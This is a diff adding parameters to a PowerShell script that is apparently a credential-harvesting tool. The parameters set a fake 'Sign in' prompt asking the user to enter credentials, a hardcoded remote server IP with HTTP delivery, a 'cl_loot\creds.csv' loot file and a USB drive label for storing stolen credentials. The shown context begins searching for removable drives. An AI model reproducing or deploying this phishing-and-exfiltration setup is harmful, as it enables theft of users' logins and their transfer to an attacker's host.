@@ -1,3 +1,35 @@
+param (
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$Caption = 'Sign in',
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$Message = 'Enter your credentials',
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$Server = "46.161.53.115",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$Port = "80",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$delivery = "http",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$filename = "\cl_loot\creds.csv",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$usblabel = "YOURUSB",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$mode = "dynamic",
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$timer = $null,
+
+    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+    [string]$override = $null
+)
+
 if ([string]::IsNullOrEmpty($override)) {
     $temp = $env:TEMP
     $volumes = get-volume | where-Object { $_.DriveType -contains "Removable" } | select DriveLetter
